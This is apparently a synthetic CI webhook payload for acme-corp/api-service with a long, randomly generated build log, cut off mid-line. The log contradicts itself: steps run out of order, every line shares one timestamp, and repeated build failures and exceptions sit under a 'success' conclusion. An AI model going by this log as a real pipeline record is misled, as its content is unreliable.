{
  "action": "completed",
  "workflow_run": {
    "id": 295,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-228",
    "head_sha": "9c7b480b68b5e1c2356d378751b9d3cfe3118e57",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-01T12:00:23.382910Z",
    "updated_at": "2025-12-01T12:04:13.203059Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nStep 8/10: Building\nInstalling react@1.2.0\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/utils.go...\n\u2717 build failed with exit code 75\n  PASS: test_user_create (61ms)\n[12:00:23] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-2137\n\u2713 lint completed\nCache hit for key-1648\nCompiling src/main.py...\n[12:00:23] WARN: Deprecated API usage\nStep 8/10: Building\nStep 5/10: Building\nCompiling src/handler.rs...\n  PASS: test_db_connect (338ms)\nInstalling jest@2.15.0\n  PASS: test_cache_hit (73ms)\n\u2713 build completed\nInstalling webpack@1.16.0\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nCache hit for key-7808\nArtifact uploaded: build.tar.gz (29MB)\nInstalling prettier@5.5.0\nStep 1/10: Building\n  PASS: test_api_health (266ms)\nInstalling express@4.14.0\nInstalling eslint@1.13.0\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n\u2713 build completed\n\u2713 lint completed\nStep 3/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5208\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: ValueError\n[12:00:23] INFO: Processing request\nStep 4/10: Building\nInstalling express@1.0.0\nCompiling src/main.py...\nCache hit for key-9976\nCache hit for key-9381\n  PASS: test_api_health (415ms)\nCompiling src/service.java...\nCache hit for key-9083\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-4896\nArtifact uploaded: build.tar.gz (3MB)\nStep 6/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 build completed\n  PASS: test_auth_login (362ms)\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-9973\nWARNING: webpack has known vulnerabilities\nCache hit for key-1850\n[12:00:23] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 build completed\nStep 9/10: Building\n[12:00:23] WARN: Deprecated API usage\nInstalling axios@3.16.0\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (39MB)\nStep 9/10: Building\n[12:00:23] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u2717 build failed with exit code 63\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (206ms)\nCache hit for key-9259\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nStep 1/10: Building\n  PASS: test_user_create (453ms)\n  PASS: test_cache_hit (3ms)\n\u2713 build completed\nStep 8/10: Building\n  PASS: test_auth_login (162ms)\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_cache_hit (128ms)\nInstalling webpack@4.20.0\n  PASS: test_db_connect (57ms)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nInstalling eslint@5.16.0\nCache hit for key-9866\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 build completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCache hit for key-6464\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 build completed\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (249ms)\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nStep 7/10: Building\n\u2713 test completed\nInstalling webpack@1.11.0\nCache hit for key-1414\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (29MB)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nException: RuntimeError\nCache hit for key-6475\n[12:00:23] INFO: Processing request\nInstalling express@3.11.0\n  PASS: test_cache_hit (416ms)\n\u2713 test completed\nCache hit for key-3270\n\u2713 test completed\nInstalling eslint@3.1.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nInstalling axios@5.6.0\n\u2713 lint completed\nWARNING: jest has known vulnerabilities\nCache hit for key-6783\nInstalling jest@5.1.0\nStep 3/10: Building\n[12:00:23] INFO: Processing request\n\u2713 test completed\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (257ms)\n\u2713 build completed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-8015\nCompiling src/utils.go...\n  PASS: test_auth_login (169ms)\nCache hit for key-4824\nCompiling src/app.ts...\nInstalling eslint@1.14.0\n\u2713 lint completed\nCache hit for key-4079\nInstalling express@3.9.0\nCache hit for key-1211\n  PASS: test_auth_login (363ms)\nStep 1/10: Building\nStep 3/10: Building\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-6968\n[12:00:23] INFO: Processing request\nInstalling eslint@4.17.0\n[12:00:23] INFO: Processing request\n=== Step integration_tests completed ===\n=== Step: checkout ===\nCompiling src/index.js...\n\u2713 test completed\nCache hit for key-2162\n\u2713 test completed\n[12:00:23] INFO: Processing request\nInstalling prettier@3.2.0\nCache hit for key-9677\nCache hit for key-3432\nStep 9/10: Building\n\u2713 build completed\nInstalling jest@5.2.0\nInstalling webpack@3.4.0\nStep 4/10: Building\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6726\nFAILED: test_db_connect\nWARNING: express has known vulnerabilities\nCache hit for key-5172\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\n  PASS: test_api_health (238ms)\nStep 8/10: Building\nCompiling src/index.js...\n  PASS: test_api_health (263ms)\nStep 3/10: Building\n\u2713 build completed\n[12:00:23] INFO: Processing request\n\u2713 test completed\nStep 5/10: Building\nCompiling src/utils.go...\nInstalling lodash@4.16.0\nCache hit for key-5699\nCache hit for key-3664\nInstalling webpack@1.12.0\n  PASS: test_user_create (394ms)\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:23] INFO: Processing request\n\u2713 build completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nCache hit for key-4041\nStep 8/10: Building\nCompiling src/index.js...\nCompiling src/app.ts...\nInstalling eslint@4.18.0\nCompiling src/handler.rs...\nCompiling src/service.java...\nInstalling prettier@1.4.0\nCache hit for key-3692\n[12:00:23] WARN: Deprecated API usage\nInstalling eslint@4.5.0\nInstalling webpack@5.12.0\nCompiling src/utils.go...\n\u2713 test completed\n  PASS: test_db_connect (376ms)\nCache hit for key-4097\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_cache_hit (91ms)\nInstalling jest@1.6.0\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-1276\n\u2713 build completed\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (123ms)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_api_health (298ms)\nArtifact uploaded: build.tar.gz (5MB)\nWARNING: prettier has known vulnerabilities\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\nFAILED: test_db_connect\nInstalling jest@5.2.0\nInstalling react@5.14.0\nCache hit for key-4475\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling express@4.0.0\nInstalling lodash@4.12.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-7093\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nCache hit for key-2956\nCache hit for key-5350\nInstalling jest@1.16.0\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-3721\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\nStep 4/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-8789\nStep 1/10: Building\n\u2713 lint completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/index.js...\n  PASS: test_auth_login (213ms)\nCache hit for key-9626\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_auth_login (70ms)\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling react@4.9.0\nCache hit for key-2442\nStep 4/10: Building\n\u2717 build failed with exit code 45\nStep 3/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-6927\nArtifact uploaded: build.tar.gz (1MB)\nInstalling prettier@4.19.0\n\u2713 lint completed\nInstalling webpack@3.1.0\n\u2713 lint completed\nCache hit for key-9540\nWARNING: axios has known vulnerabilities\n[12:00:23] ERROR: Connection failed\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: TypeError\n  PASS: test_cache_hit (421ms)\n\u2717 build failed with exit code 13\nStep 1/10: Building\nCache hit for key-4695\n  PASS: test_db_connect (397ms)\nInstalling eslint@3.6.0\nInstalling eslint@2.20.0\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\n  PASS: test_api_health (499ms)\nFAILED: test_cache_hit\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-5146\nCache hit for key-5374\nInstalling express@4.13.0\nStep 1/10: Building\nCache hit for key-8878\nCache hit for key-3519\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nStep 8/10: Building\n\u2713 build completed\nFAILED: test_user_create\n\u2713 test completed\nArtifact uploaded: build.tar.gz (10MB)\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\n\u2713 test completed\n  PASS: test_user_create (329ms)\nInstalling express@2.15.0\n  PASS: test_auth_login (473ms)\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-3857\n  PASS: test_cache_hit (264ms)\nInstalling axios@3.11.0\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (165ms)\nInstalling eslint@5.9.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1647\nInstalling lodash@5.20.0\nCache hit for key-6395\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2522\nCompiling src/utils.go...\nCompiling src/app.ts...\n[12:00:23] WARN: Deprecated API usage\nStep 9/10: Building\nCache hit for key-3019\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (477ms)\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/10: Building\nCache hit for key-1671\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\nCompiling src/app.ts...\nInstalling axios@4.16.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-1320\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:23] INFO: Processing request\nInstalling axios@1.11.0\nCache hit for key-6149\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:23] INFO: Processing request\nInstalling lodash@3.6.0\nCompiling src/index.js...\n\u2713 build completed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nStep 4/10: Building\nCompiling src/utils.go...\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nInstalling express@3.0.0\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_db_connect (22ms)\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nStep 7/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (35MB)\nInstalling webpack@2.13.0\n  PASS: test_user_create (306ms)\n[12:00:23] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (360ms)\nException: NullPointerException\nStep 8/10: Building\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3547\n\u2713 lint completed\nCache hit for key-1499\n\u2713 build completed\nStep 5/10: Building\n[12:00:23] INFO: Processing request\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_db_connect (432ms)\nWARNING: jest has known vulnerabilities\nFAILED: test_user_create\nCompiling src/app.ts...\nInstalling eslint@1.14.0\nCompiling src/app.ts...\nCompiling src/index.js...\nException: NullPointerException\nCache hit for key-4624\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-8952\nStep 1/10: Building\nWARNING: webpack has known vulnerabilities\nCache hit for key-9204\nStep 1/10: Building\n\u2713 test completed\nCache hit for key-5111\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-7566\n[12:00:23] ERROR: Connection failed\nStep 9/10: Building\nInstalling jest@1.20.0\n[12:00:23] WARN: Deprecated API usage\nStep 9/10: Building\nWARNING: jest has known vulnerabilities\nInstalling react@5.3.0\n\u2713 lint completed\nCache hit for key-8798\nCache hit for key-4979\n\u2713 build completed\n  PASS: test_db_connect (392ms)\n  PASS: test_auth_login (293ms)\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nInstalling webpack@1.6.0\nWARNING: jest has known vulnerabilities\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nStep 3/10: Building\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\nStep 2/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (167ms)\n  PASS: test_cache_hit (176ms)\nCache hit for key-5586\n\u2713 build completed\n\u2717 build failed with exit code 25\n  PASS: test_auth_login (243ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\nCache hit for key-2585\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-2659\nCache hit for key-6982\n[12:00:23] INFO: Processing request\nCache hit for key-4248\n  PASS: test_db_connect (23ms)\n\u2713 test completed\n[12:00:23] INFO: Processing request\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (110ms)\nStep 8/10: Building\n[12:00:23] INFO: Processing request\nWARNING: axios has known vulnerabilities\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: webpack has known vulnerabilities\nCache hit for key-6799\n  PASS: test_db_connect (384ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (1MB)\n=== Step e2e_tests completed ===\n=== Step: setup_environment ===\n[12:00:23] WARN: Deprecated API usage\nInstalling webpack@5.12.0\n  PASS: test_db_connect (54ms)\n[12:00:23] INFO: Processing request\nCache hit for key-4858\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:23] INFO: Processing request\nCache hit for key-2777\nStep 4/10: Building\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 test completed\n\u2713 lint completed\n[12:00:23] WARN: Deprecated API usage\nCompiling src/handler.rs...\nInstalling eslint@5.7.0\n  PASS: test_db_connect (78ms)\nInstalling react@4.17.0\n  PASS: test_db_connect (387ms)\n  PASS: test_cache_hit (164ms)\n\u2713 test completed\n  PASS: test_db_connect (292ms)\nInstalling axios@5.13.0\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nStep 6/10: Building\nCache hit for key-7118\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (152ms)\nStep 9/10: Building\nInstalling webpack@5.17.0\nStep 7/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (427ms)\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:23] INFO: Processing request\nStep 2/10: Building\n\u2713 build completed\nException: RuntimeError\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCache hit for key-5140\nCompiling src/service.java...\n  PASS: test_user_create (139ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\n  PASS: test_api_health (233ms)\n\u2713 build completed\n\u2713 test completed\n  PASS: test_user_create (464ms)\nCache hit for key-9397\nCache hit for key-7101\nStep 7/10: Building\nStep 3/10: Building\nCache hit for key-9705\nInstalling webpack@4.6.0\nStep 4/10: Building\nStep 4/10: Building\n\u2713 lint completed\nInstalling react@5.9.0\n  PASS: test_user_create (498ms)\nCache hit for key-5500\n\u2713 build completed\n  PASS: test_user_create (143ms)\nArtifact uploaded: build.tar.gz (16MB)\nStep 4/10: Building\nInstalling lodash@4.3.0\n  PASS: test_auth_login (322ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 5/10: Building\n\u2713 build completed\n\u2713 test completed\n  PASS: test_db_connect (495ms)\n[12:00:23] INFO: Processing request\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\nCompiling src/utils.go...\n\u2713 test completed\n  PASS: test_cache_hit (380ms)\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:23] INFO: Processing request\nInstalling lodash@2.19.0\nStep 3/10: Building\nInstalling express@5.16.0\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-7145\n\u2713 test completed\n  PASS: test_user_create (79ms)\n[12:00:23] INFO: Processing request\nCache hit for key-9952\nArtifact uploaded: build.tar.gz (43MB)\nException: TypeError\nStep 4/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (274ms)\nArtifact uploaded: build.tar.gz (21MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@2.1.0\nCompiling src/utils.go...\nCache hit for key-8726\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nException: ValueError\nCache hit for key-2636\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/main.py...\nStep 10/10: Building\nCache hit for key-4382\nCompiling src/utils.go...\nInstalling eslint@2.6.0\n\u2713 test completed\nStep 5/10: Building\nCompiling src/utils.go...\nInstalling prettier@5.20.0\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (26MB)\nInstalling react@4.2.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\nInstalling axios@1.17.0\nStep 6/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_api_health (451ms)\n  PASS: test_user_create (106ms)\nException: TypeError\n[12:00:23] INFO: Processing request\n\u2713 test completed\nInstalling react@2.19.0\n  PASS: test_api_health (122ms)\nStep 4/10: Building\n[12:00:23] ERROR: Connection failed\nCache hit for key-8010\n  PASS: test_db_connect (116ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/handler.rs...\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nCache hit for key-9673\nCache hit for key-9147\nCache hit for key-8735\nCompiling src/service.java...\nCache hit for key-9674\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-6408\n[12:00:23] WARN: Deprecated API usage\n=== Step deploy_production completed ===\n=== Step: type_check ===\nWARNING: prettier has known vulnerabilities\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nInstalling prettier@5.14.0\nCompiling src/main.py...\nCache hit for key-3626\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nStep 3/10: Building\nInstalling webpack@5.11.0\nStep 5/10: Building\n\u2713 build completed\nInstalling axios@2.15.0\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_db_connect (207ms)\nStep 7/10: Building\nCompiling src/app.ts...\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/service.java...\nCache hit for key-2191\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\nStep 7/10: Building\nCache hit for key-3703\nArtifact uploaded: build.tar.gz (6MB)\nStep 4/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/service.java...\nInstalling react@2.11.0\nCache hit for key-1599\nInstalling prettier@3.16.0\nCompiling src/app.ts...\nCompiling src/service.java...\n  PASS: test_api_health (487ms)\n[12:00:23] INFO: Processing request\nInstalling jest@1.3.0\nInstalling jest@2.10.0\n\u2713 lint completed\n[12:00:23] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-3462\nCache hit for key-7325\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (35MB)\nInstalling jest@5.7.0\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nStep 8/10: Building\nCompiling src/main.py...\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling webpack@2.19.0\n  PASS: test_auth_login (282ms)\nInstalling eslint@1.14.0\nWARNING: lodash has known vulnerabilities\n\u2717 build failed with exit code 97\nCache hit for key-7540\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (129ms)\n=== Step type_check completed ===\n=== Step: lint ===\n  PASS: test_db_connect (469ms)\n  PASS: test_db_connect (451ms)\n[12:00:23] INFO: Processing request\nStep 1/10: Building\n[12:00:23] ERROR: Connection failed\nCache hit for key-2158\nCache hit for key-4387\nCache hit for key-3704\n[12:00:23] INFO: Processing request\n[12:00:23] ERROR: Connection failed\nCache hit for key-1124\n\u2713 lint completed\n  PASS: test_cache_hit (187ms)\nCompiling src/utils.go...\nStep 5/10: Building\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/10: Building\nCompiling src/index.js...\nStep 9/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create (196ms)\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (351ms)\nStep 5/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_cache_hit (485ms)\nInstalling prettier@2.4.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-4346\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (80ms)\nStep 2/10: Building\nCache hit for key-3712\nStep 3/10: Building\n  PASS: test_auth_login (265ms)\n  PASS: test_auth_login (42ms)\nCache hit for key-9888\nStep 7/10: Building\nStep 1/10: Building\nCompiling src/utils.go...\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (134ms)\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (419ms)\nStep 7/10: Building\nWARNING: eslint has known vulnerabilities\n  PASS: test_api_health (52ms)\nCache hit for key-9206\n\u2713 test completed\n[12:00:23] INFO: Processing request\nWARNING: jest has known vulnerabilities\nInstalling webpack@5.2.0\nInstalling webpack@4.17.0\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-4665\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/app.ts...\nCache hit for key-6895\nInstalling jest@3.4.0\n\u2713 build completed\nCache hit for key-7617\n  PASS: test_api_health (171ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@3.1.0\n\u2717 build failed with exit code 84\n\u2713 build completed\n[12:00:23] WARN: Deprecated API usage\nCompiling src/app.ts...\nCompiling src/utils.go...\nCache hit for key-2004\nStep 7/10: Building\n=== Step lint completed ===\n=== Step: build ===\nInstalling lodash@4.3.0\n\u2713 build completed\nCache hit for key-5856\n\u2713 lint completed\n  PASS: test_api_health (426ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (390ms)\nCompiling src/main.py...\nStep 4/10: Building\n  PASS: test_user_create (179ms)\nInstalling prettier@4.18.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-9048\nInstalling express@5.17.0\n  PASS: test_auth_login (92ms)\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\n[12:00:23] ERROR: Connection failed\nCache hit for key-4407\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (451ms)\nArtifact uploaded: build.tar.gz (21MB)\n\u2717 build failed with exit code 56\n  PASS: test_user_create (52ms)\nStep 4/10: Building\n\u2713 lint completed\nStep 8/10: Building\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-2155\nArtifact uploaded: build.tar.gz (29MB)\nStep 10/10: Building\n  PASS: test_api_health (116ms)\nCompiling src/index.js...\nCache hit for key-2614\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-4029\n\u2713 test completed\nStep 3/10: Building\n  PASS: test_cache_hit (187ms)\n\u2713 lint completed\nStep 9/10: Building\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nInstalling eslint@4.14.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-6993\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:23] ERROR: Connection failed\nStep 5/10: Building\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nInstalling express@3.16.0\n  PASS: test_api_health (116ms)\n\u2713 build completed\nCompiling src/handler.rs...\nCompiling src/app.ts...\n  PASS: test_cache_hit (46ms)\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (40MB)\nInstalling express@5.10.0\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_cache_hit (439ms)\nStep 9/10: Building\nCache hit for key-8818\nStep 5/10: Building\nInstalling react@3.4.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling react@2.20.0\n  PASS: test_user_create (421ms)\n[12:00:23] INFO: Processing request\n\u2717 build failed with exit code 59\n\u2713 test completed\n[12:00:23] INFO: Processing request\n=== Step build completed ===\n=== Step: deploy_staging ===\nInstalling axios@4.12.0\nStep 4/10: Building\n\u2713 build completed\nInstalling eslint@1.7.0\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nStep 5/10: Building\nFAILED: test_user_create\n  PASS: test_api_health (241ms)\n  PASS: test_user_create (242ms)\nCompiling src/service.java...\nStep 1/10: Building\nWARNING: webpack has known vulnerabilities\nCache hit for key-5968\nInstalling express@2.17.0\n  PASS: test_cache_hit (183ms)\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nStep 4/10: Building\n\u2713 lint completed\nCache hit for key-4529\n  PASS: test_user_create (462ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nInstalling react@4.10.0\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/main.py...\nCompiling src/app.ts...\nInstalling react@4.5.0\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-4262\nCompiling src/index.js...\nCache hit for key-8084\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (22MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\n  PASS: test_api_health (141ms)\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (339ms)\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nCompiling 